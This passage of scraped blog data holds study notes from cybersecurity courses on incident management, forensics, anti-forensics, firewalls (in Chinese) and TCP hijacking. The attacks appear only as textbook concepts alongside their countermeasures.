management Logging Streamlined processes Categorisation Prioritisation Response Follow corporations\u0026rsquo; guidelines Diagnosis Escalation Resolution and recovery closure What is Incident identification in incident management workflow? Incidents are generally reported when attacks or incidents have been identified Unreported incidents False negative, pose a systematic risk to the organisation Mistakenly reported incidents False positives, when the system begin to report anomalous behaviours? Where does incident identification start with? It start with identify through the automated/manual analysis of digital artefacts and logs What is logging process in incident management workflow? Logging is the process in which systems and applications inform about \u0026ldquo;what they do.\u0026rdquo; Useful to administrators to check when something goes wrong Does incident management workflow always start with analysis of digital artefacts and logs? Incidents are often discovered by the user of the system they notice that something is abnormal they simply see evidence of an attack What are the most important elements of the logging process? The most important one is the event. Event a single occurrence within an environment consists of event fields and event records event fields describe characteristic of the event event records describe a collection of event fields What is Log in logging process? Log a collection of event records data logs log files What is Audit in logging process? Audit process of evaluating logs What is Recording in logging process? Recording Process of tracking event fields (\u0026ldquo;I am going to track an IP address\u0026rdquo;) What is Logging in logging process Logging is the process of saving events into logs What is Security incident in logging process Security incident is the occurrence of a security event (intrusion attempt or data leakage) What is the lifecycle of events? turn information from unstructured logs with low-level descriptions of the characteristics of events into a high-level representation of actionable events, namely alarms The first funnel filters decentralised logs into centralised logs then turn into normalised logs then into the second funnel The second funnel produces alarms through log filtering aggregation, correlation finally trigger the alarms Final alarms supported by false alarm reduction attack strategy analysis prioritisation What are Alarms? Alarms are meant to be reported to humans alarms help security operator analyse the strategy of an attack and prioritise responses. Intrusion detection system should be configured in such a way that false alarms are minimised What is normalisation of logs? is the procedure in which all logs that are processed by an intrusion detection system are processed and stored in a common format and all relevant attributes of the event are identified and processed What is event correlation? Event correlation brings a higher level of intelligence to the process It teaches the system to consider various conditions before trigger the alarm What is the Security information management (SIM)? The practice of collecting, monitoring and analysing security-related data from computer logs. What is the Security information management system (SIMS)? It automates the collection of event log data from security devices It translates the logged data into correlated and simplified formats It has strong log management capabilities (compress logs for storing over long periods of time) What is the Security event management (SEM) systems? It provides strong: event management real time threat analysis visualisation ticketing incident response and security operations Based on enterprise SQL databases Not ideal for log management and long-term storage of excessive amounts of logs (poor at log compression) What is the (OSSIM)? How Open Source Security Information Management (OSSIM) evaluates the risks? Risk = (Asset * Priority * Reliability) /25 Asset is the quantitative measure of the importance and/or a notion of how vulnerable a given asset is Priority is the threat or impact of the attack Reliability is the probability that a given set of events will actually be an attack Asset - 0 - 5 Priority - 0 - 5 Reliability - 0 - 10 0 - 2 = Low 3 - 4 = Medium 5 - 6 = Medium-high 7 - 8 = High 9 - 10 = Very high How forensics cooperate with SIEM? forensic investigator would collect the evidence from the source, the native logs. What is the Sensing strategies? It defines how the SIEM is deployed. It details: Where to place the different sensors how these sensors are interconnected what the security measures are who the people in charge of each sensor are collectors, normalisers aggregators Intrusion Detection Systems and correlation and report engines ","date":"2022-05-04T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_9_incident_management/","title":"CFC Week 9: Incident Management"},{"content":"CFC Week 7: Memory and network forensics Learning outcomes Define the fundamental aspects of computer and network forensics. Describe the data collection processes through the different abstraction layers. List the kind of evidence that can be obtained from volatile memory and non-persistent network data. Device forensics target the OS and the data structures present in the system What are primary sources of evidence in device forensics? are storage devices: Hard disk drives (HDDs) Solid state drives (SSDs) External media (USB sticks) How to understand the data stored on devices? Use Data abstraction layers: Physical media : - lowest level examinations Access through host bus adapter (HBA) interface which implement low-level operations: SATA and SCSI Block devices : block device is an abstract device of fixed size block use term sector as unites for magnetic hard disks Data acquisition at the block level is done through imaging File system : aims to organise the block storage into a file-based store provide files with attributes (name, size, owner, timestamps, access permissions, etc.) Application artefacts : where we find executable binaries, libraries, configuration and log files and registry entries What is the physical data acquisition in device forensics? is the process of obtaining data directly from hardware media, without the mediation of any potentially untrusted third-party software we also use logical data acquisitions which relies on one or more software layers as intermediaries Characteristics of SSDs SSDs use semiconductors to store data two memory areas: one area is used to save data one area is used as a cache SSD blocks need to be written twice in order to be reused: First write to reset the state Second write to store the data File content carving aims to recover the data by reassembling file contents from fragments why this works? Most file formats have specific beginning and end tags Four types of file content, require different carving approaches: Contiguous : The header of file A is followed by the contents of file A and ends with a footer of that file Nested : The header of file A is followed by a part of that file\u0026rsquo;s content, then the header of file B is present followed by the content and footer of that file. A finished after B. Bifragmented : The Header and some part of file A followed by some unrealted data then followed by remains The recovery of this file will depend on how easily the unrealted data is recognised Interleaved : The content of file A is mixed with File B, A finished before B Why we are interested in doing Memory forensics? Data can persist for quite a long time in volatile memory Volatile memory can contain useful information which hard disk does not (en/decryption key) How to perform offline memory forensics Freeze the RAM of a computer What a forensic analyst must know about memory forensics? What are the things that might change across time? What are the things that will not? How presenting evidence from memory can impact your investigation What are the challenges behind live forensics? In live forensics, we\u0026rsquo;re unsure whether evidence will be accepted or not. Extract evidence from memory is not easy and takes long time What does generally change? Process information identifying correlated user actions and file system activities, potentially demonstrating their intent Running processes Threads and loaded systems modules Copy of the individual processes\u0026rsquo; code, stack, heap, code and data segments Artefacts and fragments Caching disk and network data tends to leave traces in memory for a long time File information open files shared libraries shared memory anonymously mapped memory Network connections closed network connections protocol information sending and receiving queues of data not yet send or delivered Network forensics monitor and analyse the computer network traffic for information gathering, legal evidence or intrusion detection Why is the difference between network forensics with other digital forensics network investigations focus on volatile and dynamic information because network traffic is transmitted and then lost Thus the data would be actively collected What are two common scenarios in network forensics? Security monitor a network for anomalous traffic and identify intrusion. when attacker has erased all log files on a compromised host Law enforcement reassemble transferred files search for keywords parse human communication What are two strategies in network forensics? \u0026ldquo;catch-it-as-you-can\u0026rdquo; all packets are captured and written to storage for analysis require large amounts of storage \u0026ldquo;stop, look, listen\u0026rdquo; each packet is analysed in a rudimentary way in memory only certain meta information is saved require more processing capabilities What method we apply to network forensics on ethernet layer? Use sniffer to eavedrop the beta stream: Wireshark and tcpdump Wireless forensics collect and analyse wireless network traffic that can correspond to plain data or with a broad usage of. ","date":"2022-05-03T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_7_memory_and_network_forensics/","title":"CFC Week 7: Memory and network forensics"},{"content":"CFC Week 8: Anti-forensics Learning outcomes Describe the most relevant anti-forensic techniques. Explain the challenges behind handling encrypted devices. What is Anti-forensics\u0026rsquo; goal? It aims to evade and thwart the forensic process through the implementation of attacks and adoption of adversarial actions. What are four most adversarial actions adoptted in Anti-forensics Destroy : destroy potentially useful digital forensic evidence of their activities (like wiping log files) Divert by : Plant misleading digital forensic evidence spoofing the source IP address of a cyber attack Deceive by : hide potentially useful digital forensic evidence, use steganography onion-routing Deny : Deny the access of potentially useful digital forensic evidence use cryptography and conceal the evidence What is meant by Full disk encryption? Secure the disk and other volumes with strong encryption key (2048 bits by TrueCrypt) How may a digital forensic examiner attempt to overcome FDE (full disk encryption) in a reasonably short time? In order to operate full disk encryption, the decryption key must be stored in main memory or in a separate device. Use live forensic techniques to retrieve the decryption key to decrypt the disks. FDE is not in operation: key might stored in a TPM (trusted platform module), a hidden partition or a dongle use cold boot attack which freeze the RAM to get stored encryption keys How to make a sound forensic analysis (soundness)? Acquisition of data should change the regional evidence as little as possible changes needed to be explained and documented Documentation where the evidence originated? how it was handled? When credentials for decrpyting are not available, what we can do with Full-disk encryption system? Attempt decryption brute force attack dictionary attack Load duplicate into a virtual environment decrypted later in a number of ways Restore to a working hard disk Boot a restored clone of the original disk How to avoid an online suspect who is also technically sophisticated to tamper or erase the digital evidence? Distraction Hoax parcel delivery Meter reader kiss-o-gram Disablement disconnect electrical power supply pipe CS gas use a taser Reverse engineering aims to understand both: how malware technically behaves and how opaque system function prior to a forensic investigation ","date":"2022-05-03T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_8_anti_forensics/","title":"CFC Week 8: Anti-forensics"},{"content":"CFC Week 6: The forensics process Before the forensics Why we said that computer information is a double-edged sword in forensic? One the one hand, this information can provide compelling evidence in an investigation One the other hand, it also introduce complexity that can trouble experienced practitioners 8. How does digital forensics differ in practice from conventional forensics? Conventional forensics\nConventional forensics is based on Locard's Exchange Principle Locard\u0026rsquo;s Exchange Principle : Every contact leaves a trace. Physical contact leaves exchange of physical material. Conventional forensics also called wet forensics : Human body sweats, fingers are greasy -\u0026gt; touch and walk leave fingerprints and footprints Why we need to isolate the crime scene, and How? To save a great number of logs which provide actions and interactions and avoid: Cover digital tracks and commit the perfect cybercrime What are the paramount challenges of crime scene isolation? More and more devices are hyper-connected Why the crime scene need to be frozen, and How? Services are connected to network or Internet, to define the crime scene, we have to freeze the scene and control the range. freeze the memory RAM of a device,and also cut the network (Faraday cage to cancel wireless signal) Define digital forensics process A set of methods driven towards the acquisition of legal evidence, which is possible for presentation in a court of law. i. Acquisition process \u0026ldquo;Going there and getting the stuff\u0026rdquo; Judges have reasonable suspicion A warrant indicates what type of devices that a forensic can seize (which corresponding to suspicions due to principle of proportionality The place of a device is found is important to determine whether it\u0026rsquo;s relevant or not (like the one hidden in secret compartment of a drawer, even the type of mobile phone is not on the list) Careful documentation of the acquisition process: take photographs tag all the bags with all details watch out for hidden devices in plain sight ii. Preservation Provenance and change of custody are paramount (based on ACPO principles) Making bit-for-bit images of all seized media Use Write-blocker to make all drive devices read-only Use cryptographic hashes to verify the integrity of the files (MD5 of SHA2) In traditional forensics, you can destroy part of the evidence once you done with interventions like DNA testing the sample used in testing could be destroyed after the test However in computer forensics, 2,3 are required for the future iii. Searching aims to reduce the data volume to a manageable and reviewable level, but it has potential to impact the completeness and accuracy of an investigation Search Method Keyword-searching (not works on encoded or encrypted files, there are other tools) Other tools for special files(compressed, encoded, encrypted or password protected files) What if you find a evidence of another crime?\nStart an independent process with warrant Not allowed to collect evidence for that crime iv. Analysis of evidence aims explain what does the evidence signify? correlate evidence to your hypothesis explain their timeline identify what has happened v. Evaluation of evidence aims to confront the evidence Assess how strong that evidence is Challenge your own hypothesis using the evidence Be able to know how compelling evidence is vi. Reporting aims to inform how the forensic analysis has reached a conclusion It should be done in a form and style that lets both: Technical experts validate their findings Legal personnel and juries can understand it Put layman's terms what the evidence means on executive summary would help Characteristics of Legal Evidence (in UK) Admissibility Evidence has to be first-hand information, original and not hearsay. Authenticity Evidence should be genuine with clearly authentication to authenticate what it claims to be. The correctness would be determined by court and judge later based on the evidence (we just try to use evidence to tell the hypothesis and evidence are correct) Accuracy Evidence should provide precise, clear and not vague information Completeness Evidence should be self-contained and not partial Probative value Evidence should be probative, if evidence\u0026rsquo;s danger outweight the value, the court can exclude it Danger of evidence introduce an unfair prejudice confuse the issues mislead the jury introduce undue delay or waste time, or just simply present cumulative evidence List and describe the key steps of the investigative methodology Fundamental questions relating to a crime Sequencing (when things happend?) Linkage (who interacted with whom?) Evaluation of source (the origin of items) Attribution (who is responsible?) What is the scientific method? Scientific method is a cyclic process, aims to repeat the steps to get the conclusion Gather information and make observations : aims to provide all evidence which you have access to Process legal evidence: 1. Acquire 2. Preserve 3. Search 4. Verify integrity 5. Authentication Process digital evidence: 1. preprocess 2. salvage deleted data 3. handle special files 4. filter out irrelevant data 5. extract embedded metadata Form a hypothesis to explain observations : Develop possible explanations Evaluate the hypothesis : Aims to suppress biases and hunches and try to disprove current working hypothesis through experiment Avoid confirmation bias: - do not skew our thinking and analysis in favour of the working hypothesis Draw conclusions and communicate findings : Communicate the explanations which supported by evidence with decision makers Understand the capabilities of the tools Understand the capabilities of the tools Use multiple tools when possible List the functions of forensic analysis Attribution of activities : aims to attribute computer activities to a particular person To avoid a person to deny the responsibilities for the illegal activities, we could use personal communication access to online banking or e-commerce accounts Assessing alibis : use evidence from multiple sources Determining intent : analyse: internet search history suspicious behaviours notes and plans Evaluating sources : reveal the source of the evidence, and where it is produced or altered. Compare the evidence with an exemplar can reveal useful information Document authentication : - Look for nuances on date-time stamps look for metadata within files extract attributes buried within storage media The e-discovery process What is the e-discovery process Exchange of data between parties in civil or criminal litigation The process is largely controlled by attorneys who determine what data should be produced based on relevance, or withheld based on claims of privilege Electronic Discovery Reference Model Preservation Ensuring that ESI is protected against inappropriate alteration or destruction. Collection Gathering ESI for further use in the e-discovery process (processing, review, etc). Processing Reducing the volume of ESI and converting it, if necessary, to forms more suitable for review and analysis. Review Evaluating ESI for relevance and privilege. Analysis Evaluating ESI for content and context, including key patterns, topics, people and discussion. Production Delivering ESI to others in appropriate forms and using appropriate delivery mechanisms. Presentation Displaying ESI before audiences (at depositions, hearings, trials, etc), to elicit further information, validate existing facts or positions, or persuade an audience. ","date":"2022-05-02T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_6_the_forensics_process/","title":"CFC Week 6: The forensics process"},{"content":"NSE Week5: Firwalls How to protect edges of the Internet or Internal network? Local area networks (LANs), personal area networks (PANs), wireless local area networks (WLANs), 以及 wireless sensor networks (WSNs) 都属于Internet的最边缘，大多都是个人组织或者家庭所拥有的内部网络，我们可以把保护这样的互联网边缘网络或者内部网络比喻成保卫一座城市，通过三层的保护措施来防止入侵: Perimeter Security (边界安全): 通过减少入口来控制进出，派遣武装守卫把守，同时要求进出的人员拥有预先设定的证明 Street patrolling (街道巡逻): 派遣武装守卫定期上街巡逻，来识别入侵者 House cleaning (入室排查): 派遣专业的安全专家挨家挨户的排查外来危险品以及安全漏洞 这三道对于城邦的包围也就可以对应网络安全中的三项技术： Perimeter Security \u0026lt;-\u0026gt; Firewall: 防火墙 Street patrolling \u0026lt;-\u0026gt; Intrusion detection systems: 入侵检测 House cleaning \u0026lt;-\u0026gt; Anti-malicious-software: 杀毒软件 而我们今天要讲的，就是内网的第一道防线，防火墙。 在正式介绍防火墙之前，我们最后再介绍一下针对边界攻击的防御理念：5Ds of Perimeter Security: Deter -\u0026gt; Detect -\u0026gt; Deny -\u0026gt; Delay -\u0026gt; Defend Deter : - 组织入侵的发生（在其发生之前进行组织），即使用 fencing 围栏, lighting 完全照明, signs 出入签名 等方式对犯罪者进行被动威慑，从最开始就扼杀入侵的念头 使攻击变得困难，让attacker主动放弃 Detect : - 检测入侵的行为，例如 CCTV 监控, 用来监控和记录所有的入侵行为 Intrusion detection software Traffic analysis and machine learning to detect abnormities Deny : - 拒绝未经授权的访问，通过一些认证系统来主动拒绝入侵的行为，其中防火墙就属于 Deny Authentication, authorisation, freshness Delay : - 延缓入侵的速度，通过设置障碍来延长入侵的时间，迫使入侵者放弃或者给予安全团队更多的时间 增加密钥的长度 Defend : - 主动地对入侵者进行打击，通过安全团队或者警方的行动来组织入侵 What is a firewall? 什么是防火墙，它有什么作用呢？ 防火墙是一台主机或者一个网络服务，架设于 内网 和 外部网络 之间，用来： 防止坏事发生 (内部泄露机密到外部，外部攻击内部系统) 同时使正常的行为不收到影响(员工正常访问外网交互) 防火墙的主要功能 主要工作：Access control 访问控制 建立一道屏障，所有方向上的网络流量都需要经过防火墙 防火墙会预设一系列安全协议来对所有这些经过的流量进行审计和控制（可以对异常的行为设置警报） 可以对IP packet或者更早层的数据进行过滤 同时也可以部署NAT(network Address Translation)服务以及使用监控等服务 也可以通过IPSec来实现VPNs 防火墙的技术 What? -\u0026gt; Service Control 通过 transport layer ports 决定 决定 What types of Internet services 可以通过 Where? -\u0026gt; Direction control 通过 {Source adddress -\u0026gt; Destination address} 决定 决定特定方向的流量是否可以通过 Who? -\u0026gt; User control 通过 {IP address -\u0026gt; Transport layer port} 决定 决定什么服务可以被什么用户所访问 How? -\u0026gt; Behaviour control 控制服务应该被如何使用，比如一些核心的服务只能在特定的时间被使用 防火墙的类型 Positive filter 主动过滤，白名单过滤，只允许符合规则的数据通过，其他都不可以通过 假设所有人都是坏人 主动地选定谁是好人，允许其通过 Negative filter 被动过滤，黑名单过滤，不允许不符合规则的数据通过，其他都可以通过 假设所有人都是好人 被动地，在发现了坏人之后，将其过滤 根据防火墙的类型，过滤的策略也会不一样: 一个或多个协议头 Payload的内容 一串数据包的pattern 防火墙的限制 防火墙也存在很多的限制，要不怎么需要多道的保护呢 其无法保护: 绕过过滤规则的进攻 在外部被感染的设备 通过外部的WiFi网络进行的攻击 来自内部的威胁 sneakernet\n球鞋网络，顾名思义就是使用物理媒介运输数据，而非通过网络，记得以前上计算机网络的时候，老师就提到过，在网络不稳定或者质量较差的时候，往往还是使用物理传输更为高效 那么这种时候 Firewall 就完全失效了，因为其所针对的都是网络数据包，物理传输完全不在范畴之内 WiFi\nWiFi之前的数据共享没办法集中到Firewall进行管理 Packet filtering firewall What is a packet filtering firewall? 基于数据包过滤的防火墙 是最基础也是最普遍使用的防火墙，其作用在两种数据包上： Ingress packets: 从外网到内网的数据包 Egress packets: 从内网到外网的数据包 同时也对应 ingress filtering, egress filtering 两种过滤手段： Packet filtering firewall 通过预设一系列的规则来决定是否让某一种数据包通过，而这些规则都是用来检测 IP headers 以及 TCP headers, 对于应用层所放入的payload一点都不感兴趣 Packet filtering firewall 也分成 stateless filtering 以及 stateful filter,主要的区别就在于应用的规则是否会审计网络连接的状态，即判断一个数据包的去留是否会参考之前的记录，也可以说是考虑了上下文 Stateless filtering 无状态过滤 其无状态的过滤主要体现在： 对所有收到的包都一视同仁，单独决断是否放过 以前的记录不会影响对改数据包的判断 我们之前提到过 Packet filtering firewall 主要是通过审查 IP headers 以及 TCP headers, 那么细化来说 是IP header中的： Source IP address Destination IP address other fields: defines the transport protocol 以及 TCP/UDP header 中的： Source port Destination port 通过设定对以上信息的规则来实现过滤审查，那么所有的这些规则都会被记录到 ACL (access control list) 访问控制列表上. 过滤规则\n通常来说，ACL上定义的规则会被 从上至下 依次与审查的数据包进行匹配，然后执行对应的动作。 默认规则\n之前我们提到过主动过滤和被动过滤，在这里我们展开讲讲 Default = discard 默认丢包 : - 主动过滤（主动的选择可以通过的名单） - 白名单过滤 - 禁止未经明确许可的行为 (That which is not expressively permitted is prohibited) - 更为稳健和保守的政策 - 所有被允许的服务都需要一个个添加 - 对用户不太友好（就像我们之前所提到的，用户的端口更为灵活，利用白名单一个个加很不明显） - 用户的可见性随着规则的增加而降低 - 相对的，对企业和政府来说更加友好 Default = forward 默认放行 : - 被动过滤（默认不用过滤，直到被动的知道了有威胁才过滤） - 黑名单过滤 - 没有明确禁止的就是允许的（That which is not expressively prohibited is permitted） - 较于白名单更不安全 - 每当出现新的威胁需要更新记录到黑名单上 - 通常被开发的组织采纳，比如大学 Granularity of filtering 过滤的颗粒度 : 除了前面提到那几个常见的匹配规则，还有一些内容可以实现更精确的过滤，根据firewall使用的不同的routers来决定 - 在入站时进行过滤 - 在出站时进行过滤 - 在入站和出站同时进行过滤 - 检查数据包的其他控制区域 ACL实例\nRule set A\n我们先来看这第一组规则 \u0026rsquo; * \u0026rsquo; = ANY 第一条 : 所有与 SPIGOT 的通信都被禁止了 1. 两个端口号都没有指定，说明这条规则没有方向（端口号的大小指示了客户端和服务端） 2. 只指定了 SPIGOT 的IP地址，说明到SPIGOT的数据包和从SPIGOT来的数据包都会被禁止，也许是以前有过恶意行为，所以被整一个禁止了 第二条 : 所有内网开启的SMTP服务都允许被外网所连接 1. 指定了IP地址以及对应的端口号25， 是SMTP服务所对应的端口 2. 这里是允许内网的邮件系统收取邮件 Rule set B\n默认丢弃所有的数据包 这是一条默认丢弃规则，一般来说是放在最下面 默认丢弃就是我们之前说的主动过滤，白名单过滤 在此之上就是定义的可以通过的规则 Rule set C\n与rule set A类似，这次是允许内网所有的主机向外发邮件 但是存在两个漏洞 攻击者也可以修改他们服务端口号到25，这样就可以使泄密的数据绕过防火墙策略 attacker也可以修改他们的客户端端口号到25，从而绕过防火墙策略实现入侵，连接内网的服务 Rule set D\n与之前三条不同的是，Rule set D多了flags的信息，主要运用于TCP的连接的判断 第一条和之前Rule set C一样，是允许内网的主机发送邮件到外网 第二条则做了更多的限制，要求进入内网的邮件需要是TCP ACK数据包 Rule set E\n第一条，允许内网的主机向外发送数据 第二条，允许回复的ACK包 第三条，允许内网的服务对外网的客户端进行回复 (port \u0026gt; 1024) 其他常见过滤规则\nIngress packet 的source IP address 是内网的地址 : 我们知道防火墙是建立在内网和外网之前的，因此 Ingress packet 只有可能是从外网的地址到内网的地址，这类不寻常的数据包通常都是被恶意修改的数据包 指定了路由器的数据包 : 这类数据包通常也是被恶意修改的来绕过防火墙规则的 Payload特别小的数据包 : 这类特别小的数据包，很有可能是用来分离会被审查的信息，以此来绕过防火墙规则 来自外网地址的用于控制的数据包 : 有一些数据包是专门用来进行内网设备管理和控制的，比如DHCP, Bootp, TFTP, NFS, 都是来给内网下发指令或者发送配置的，这些数据包如果来自外网很有可能就是恶意的，应该丢弃 Stateless filtering的优劣势以及漏洞\nAdvantages\n实现 stateless filtering 比较方便 规则对用户比较透明，速度也很快 Disadvantages\n没办法对更高层的数据进行过滤，因此没办法部署对于应用层的漏洞的过滤 一些恶意的指令（存在于payload中）无法被过滤 如果一个客户端端口号被允许通过（\u0026gt;1024）,那么其所有的数据包都会被放行 日志记录的信息较少（因为本来指定规则以及审核数据包所需要用到的数据就很少） 无法部署高级的认证系统 同样因为缺乏高层的审核功能 Vulnerabilities\n无法检测出TCP/IP被修改过的数据，spoofing attack 无法应用更高层的审核机制，导致数据内容被修改后即可绕过规则 由于用于过滤规则制定的变量较少，因此错误的配置很容易就发生了，从而招致入侵 攻防实例\n接下来我们来看一些攻防的实例，来看看stateless filtering能抵御哪些攻击 IP address spoofing\nIP address spoofing 通常都是通过修改IP地址来欺骗服务器其真正的主机地址 Countermeasure : - 我们可以制定一些规则来避免一些不合理的数据包，例如 - Ingress（从连接外网的interface传向连接内网的interface）的数据包本来应该是外网到内网的地址，可如果source IP address变成了外网的地址，那就有问题了 Source routing attack\nSource routing是一种特殊的路由机制，即发送方可以指定到达接收方的路由（通常来说，我们只是指定gateway，然后让路由器去寻找路由） 那么Attacker可以利用这个机制来伪造数据包的IP address绕过过滤规则，同时使用source routing指示数据包真正的路径和方向 Countermeasure : - 丢弃所有使用source routing的数据包 - 禁止这些指定了路由的数据包 Tiny fragment attacks\n就像我们之前提到过的，攻击者可以将数据包分离成多个小的数据包，将所需要的信息分散到小的数据包当中，而防火墙往往只会检查最开始的数据包片段，由此可以绕过检测规则 Countermeasure : - 防火墙可以设定一些规则比如，丢弃所有分散化的TCP数据包，或者在进行审核之前先重组这些数据包片段 - 规定第一个数据包片段必须含有足够多的数据便于防火墙审核 补充知识\nTCP port numbers\n我们再来复习一下 TCP port numbers TCP port number 一般用来指示运行的应用或者服务： 服务器端（本地的）应用的端口号一般小于1024，这些端口号一般都已经被占用了，我们自己在写程序的时候应该避免使用 而其他1024~66535的端口号一般被用于客户端（外部的）程序 (16 bits端口号) 还记得我们之前的送快递的例子吗，我们说传输层是上保险，IP地址是送货地址，网络层是找送货的地图，MAC地址是邮编，物理层是送货，那么这个端口号就是写的名字，表明是什么服务传输数据给什么服务 从中，我们又看出了一些 stateless filtering 的局限，用户的端口号千变万化，那么就会设置一下较为宽松的规则，从而引发漏洞 How to block an entire subnet?\nUse subnet address with CIDR prefix or subnet masks，使用子网划分的后缀 Stateful firewall Stateful filtering, 也叫做 connection-state filtering,通过追踪外部和内部的主机的连接来决定出入规则 Connection state 当我们说连接的是，指的就是一个TCP连接的状态，是否已经建立（UDP不建立连接） 所有这些建立的TCP连接都会存入 state table (但如果保存了大量的连接，就会出现TCP SYN Flooding 这样的攻击) How stateful firewall works?\n当有ingress或者egress的数据包通过的时候，firwall会查找 state table 来判断他们是否属于被记录的connection 如果属于一个连接，发行，并记录信息（比如TCP sequence number，可以用来防御 TCP session hijacking ） 如果不属于，再判断这是否是一个 TCP SYN packet 用来建立一个连接: 如果是的话就新开一条记录用来记录这个新的连接 如果不是的话，那就丢弃 Drawbacks of stateful firewall?\n我们可以同时使用 stateful filtering 以及 stateless filtering,因为从上面的描述中，也许有一些朋友已经嗅到了一丝漏洞的味道，存储 -\u0026gt; Emm -\u0026gt;flooding lol. 查询连接，判断从属，记录信息等等这些动作都需要消耗大量的存储空间和CPU资源，因此很容易遭受攻击，因此可以选择只保存有限的信息，以及一段时间内的连接来减少消耗 IPTables\nIPtables是Linux的 stateful packet filtering工具，其主要的功能有两个： Tables :\nChains : 定义了一系列的过滤规则用来处理经过的数据包，然后做出响应的决定（accept or drop） Stateful firwall and proxy firewall Circuit-level gateway/proxy firewall Circuit-level gateway/proxy firewall 位于 session layer 会话层，根据网络模型的不同，有一些教材也有说是跑在 Transport layer 传输层的。 也被称为 circuit gateways, transparent proxy firewall 其主要的目标是对内外网想要建立的连接进行审核，通过 packet filters 与 circuit gateways 的结合可以构造起一个 dynamic packet filter 如何实现连接的过滤呢？\n主要是通过 relay/proxy 连接，gateway会分别与 server side 以及 client-side 建立独立的连接 在packet filter，无论是 stateful 或者是 stateless 中，服务端和客户端的连接都是直连的，而在 circuit-level gateway中实现的relay可以很好的隐藏server和client的信息，外网只能观察到gateway的IP地址，而不知道具体连接的内网设备的信息 上图就是当外网的client想要连接内网的服务，就会先与gateway建立连接，gateway会维护一个有效连接的表，如果连接是被允许的，那么就会继续建立连接，gateway会用公网IP地址与外网的client建立一个TCP连接，再与内网的设备用内网IP建立TCP连接，之后就不再过滤数据，只是做煎蛋的转发。 Application-level proxy firewall Application gateways, also referred to as application-level gateways (ALG) or proxy servers, 是安装在指定设备上的软件包，像proxy一样，用来为内网用户处理来自外网的服务请求。 ALG可以被配置为应用的特定特征进行过滤，例如MIME，或者SQL格式来决定数据包的payload是否合法。 通过监测分析这些payload，ALG可以检测出恶意代码还有可疑的数据包，进而屏蔽可以的IP地址以及端口号，这些处理将会要求ALG服务器有大量的运算处理和存储的需求。 ALG采用白名单的形式，需要为不同的applications配置不同的审核机制，否则就不能进行传输 If gateway does not implement the proxy code for a specific application, then the service is not supported and cannot be forwarded across the firewall 如何连接到ALG服务?\n用户使用TCP/IP应用来进行连接，例如Telnet/FTP ALG会要求用户提供想要连接远程用户的名字 用户提供有效的user ID以及相关的认证信息 ALG会relay TCP segment来进行监测并转发 ALG的优点\n相较于 packet filtering firewalls 更为安全 只需要监测一小部分特定的应用即可 更方便的记录日志以及监测应用层的payload ALG的缺点\n每一个服务都需要进行proxy 需要大量的计算处理以及消耗大量的存储空间 Bastion hosts and Gateways 我们之前提到的 Application gateway 出于内外网之前充当转发的作用，但是相对的，ALG暴露在外网这种，因此我们需要对其提供更多的保护，一种就是 Tursted Operating Systems (TOS), 还有一种就是我们本章将要提到的 Bastion hosts 堡垒机。 Bastion hosts堡垒机将提供强大的防御措施，包括联合使用我们之前所提到过的 application gateways, circuit gatways 以及各种类型的firewalls，同时堡垒机安装了可以信任的操作系统TOS，只提供必要的程序功能，例如SSH, DNS, SMTP, authentication programs。 Bastion上的Proxy必须满足以下条件 Gateway software的开发必须使用小型的module，因为小型的module更加容易检查漏洞，并方便重复使用 堡垒机必须对网络层的用户进行单独的身份认证，例如通过IP packet 中的 source IP address以及destination IP address，这将与更高层的验证分离开来进行身份认证 堡垒机需要尽可能少得去连接内网的主机，这样一旦堡垒机出现问题，波及到的主机也会减少 堡垒机需要记录所有的系统日志，包括TCP会话连接状态，这将帮助管理员发现问题 所有跑在堡垒机上的代理服务都需要独立运行，一旦一个gateway发生问题，只需要单独关闭即可 堡垒机应该避免将数据写入硬盘保存（只写入内存中？），避免恶意软件的写入 堡垒机上运行的gateway软件不需要给予管理员权限 Bastion host case study AWS就是通过设置堡垒机以及其中的Gateway来对危险的SSH进行relay，避免暴露真正的Linux instance Firewall location and configuration Personal firewall 个人防火墙的主要目的是控制用户电脑与外网的网络流量 位置：通常是安装在个人电脑或者路由器上的软件包 主要作用： 拒绝未经许可的外部访问 监控出站流量来分析恶意软件的活动 Host-based firewall Host-based firewall其实与personal firewall十分相似，区别我觉得就是personal firewall一般是用在普通用户所使用的操作系统上的，而Host-based firewall则更多的是服务器上的使用，但特点都是一机一wall 而我们之前提到的用来分割内外网的firewall我们称为network-based firewall，区别就在于起作用域不一样 位置：通常被安装在一个web服务器上 Advantages\n可以根据主机的情况进行过滤规则的定制 可以根据企业不同的安全政策进行定制 可以防御内部以及外部的网络 DMZ networks DMZ\n位于两个防火墙中间的子网我们称为Demilitarised Zones (DMZ 非军事化区域？), 其可以是物理的也可以是逻辑子王 外部的firewall保护DMZ网络来自外网的威胁 针对外网的连接 内部的firewall保护DMZ网络来自内部的威胁 保护那些直接从DMZ网络中发出的攻击，例如worms, rootkit, bots DMZ中还可以嵌套DMZ形成多层的DMZ，那么连接在最末端firewall的子网就是最安全的，相反，连接在最外侧的firewall就是最不安全的，因为他们只有一个firewall的保护，随着结构的增加和复杂化，安全系数也在提高，攻击者需要绕过一层层的过滤规则才能到达最末端的设备。 通常来说，一些不需要特别强的保护的服务器电脑和其他设备会被放到DMZ网络中，他们起码可以避免暴露在外网当中。 例如我们可以把WAF和负载均衡这些功能性的服务器给放置在DMZ网络中 还有一些用于促进内外连接的服务器也会防止在DMZ中，例如企业网站，邮件以及DNS服务器 Distributed firewalls 分布式的防火墙框架，将综合使用多种防火墙，比如单独的防火墙设备以及安装在各个server上的host-based firewall 以及 安装在各个用户系统上的 personal firewall Security monitoring 日志记录 防火墙统计数据 对于单独的用户的监控 Cloud firwalls Virtual private cloud (VPC) Azure Firewall Firewall summary ","date":"2022-04-29T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/nse_week5_firewalls/","title":"NSE Week5: Firewalls"},{"content":"NSE Week4: Hijacking and poisoning TCP Session Hijacking What is Hijacking 劫持? 指的是劫取其他人的东西，特别是在运行的时候。 Hijacking 劫持与spoofing的不同点在于： Hijacking 是劫持一个已经存在的TCP连接 而Spoffing则是通过修改IP header来发起新的连接进行欺骗 Off-path v.s. On-path adversaries\n顾名思义，就是判断发起劫持的主机是否在连接的两台主机的路由上： 如果在路由上，那么就是On-path, 这种劫持更为强大，可以直接注入错误的信息，但是却很难扩大规模 